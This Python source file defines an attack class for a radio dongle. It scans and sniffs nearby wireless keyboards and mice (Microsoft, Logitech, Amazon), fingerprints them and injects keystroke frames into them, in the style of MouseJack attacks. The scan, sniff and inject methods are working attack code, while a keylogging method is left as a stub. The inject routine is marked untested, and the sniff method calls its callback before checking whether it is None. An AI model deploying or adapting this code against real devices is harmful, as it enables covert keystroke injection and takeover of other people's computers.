#!/usr/bin/env python3
"""
file to hold class for attack management
"""
import logging
import os
import time

from plugins import microsoft, logitech, amazon, microsoft_enc

import dongle

plugins = [microsoft, microsoft_enc, logitech, amazon]


class Attack(object):
    """class for attack management"""

    def __init__(self, current_dongle: dongle.Dongle, enable_lna):
        self.current_dongle = current_dongle
        self.init_radio(enable_lna)
        self.channels = range(2, 84)
        self.channel_index = 0
        self.ping = [0x0f, 0x0f, 0x0f, 0x0f]

    def init_radio(self, lna):
        """
        radio initialization
        """
        if lna:
            self.current_dongle.enable_lna()

    @staticmethod
    def from_display(data):
        """
        format data from string
        """
        return [int(b, 16) for b in data.split(':')]

    @staticmethod
    def to_display(data):
        """
        format data to string
        """
        return ':'.join('{:02X}'.format(x) for x in data)

    def scan(self, callback=None, dwell_time: float = 0.1):
        """
        scan frequencies for target devices
        calls callback function everytime a device is found
        will continue unless callback function returns True
        """
        self.current_dongle.enter_promiscuous_mode()
        self.current_dongle.set_channel(self.channels[self.channel_index])
        last_tune = time.time()

        while True:
            if len(self.channels) > 1 and time.time() - last_tune > dwell_time:
                self.channel_index = (self.channel_index + 1) % (len(self.channels))
                self.current_dongle.set_channel(self.channels[self.channel_index])
                last_tune = time.time()
            try:
                value = self.current_dongle.receive_payload()
            except RuntimeError:
                value = []
            if len(value) >= 5:
                address, payload = value[0:5], value[5:]
                # logging.info("ch: %02d addr: %s packet: %s" % (self.channels[self.channel_index], self.to_display(address), self.to_display(payload)))
                if callback(self.channel_index, address,
                            payload):  # if we got True from the callback function, then we need to stop
                    return self.channel_index, address, payload

    def sniff(self, address, callback=None, dwell_time: float = 0.1, timeout: float = 5.0):
        self.current_dongle.enter_sniffer_mode(address)
        self.channel_index = 0
        self.current_dongle.set_channel(self.channels[self.channel_index])
        last_ping = time.time()
        start_time = time.time()

        while time.time() - start_time < timeout:
            if len(self.channels) > 1 and time.time() - last_ping > dwell_time:
                if not self.current_dongle.transmit_payload(self.ping, 1, 1):
                    success = False
                    for self.channel_index in range(len(self.channels)):
                        self.current_dongle.set_channel(self.channels[self.channel_index])
                        if self.current_dongle.transmit_payload(self.ping, 1, 1):
                            last_ping = time.time()
                            success = True
                            logging.info("Ping success on channel %d" % self.channels[self.channel_index])
                            break

                    if not success:
                        logging.info("Ping failed")
                else:
                    last_ping = time.time()
            try:
                value = self.current_dongle.receive_payload()
            except RuntimeError:
                value = [1]

            if value[0] == 0:
                # hack to keep it on channel
                last_ping = time.time() + 5.0
                payload = value[1:]
                logging.debug("ch: %02d addr: %s packet: %s" % (
                    self.channels[self.channel_index], self.to_display(address), self.to_display(payload)))
                callback(address, payload)
                if callback is None:
                    return payload

    def detect(self, callback=None):
        """
        detects devices nearby, higher level than sniff or scan
        """

        # noinspection PyUnusedLocal
        def find_and_format_hid(channel, address, payload):
            """
            formats the hid and calls parent callback
            """
            hid = self.get_hid(payload)
            if hid is None:
                callback("Found an unknown device with address " + self.to_display(address) + " (payload: " + self.to_display(payload) + ")")
            else:
                callback("Found a " + hid.description() + " at address " + self.to_display(address))

        self.scan(callback=find_and_format_hid)  # do the scan


    @staticmethod
    def get_hid(payload):
        """
        fingerprint a device from a given payload and return it's corresponding decoder/encoder class if it exists
        """
        if not payload:
            logging.info("no payload detected")
            return None
        for hid in plugins:
            if hid.HID.fingerprint(payload):
                return hid.HID
        return None

    def keylog(self, address=None, hid_name=None, callback=None, timeout: float = 5.0, dwell_time: float = 0.1):
        logging.error("stub code")
        # todo stub

    def inject(self, address, inject_string, dwell_time: float = 0.1, timeout: float = 5.0):
        """
        inject a string to an address
        """
        # todo need to test
        # todo make address optional
        hid = self.get_hid(self.sniff(address, dwell_time=dwell_time, timeout=timeout))
        hid.build_frames(inject_string)  # todo not sure if this code should be here
        for key in inject_string:
            if key['frames']:
                for frame in key['frames']:
                    self.current_dongle.transmit_payload(frame[0])
                    time.sleep(frame[1] / 1000.0)
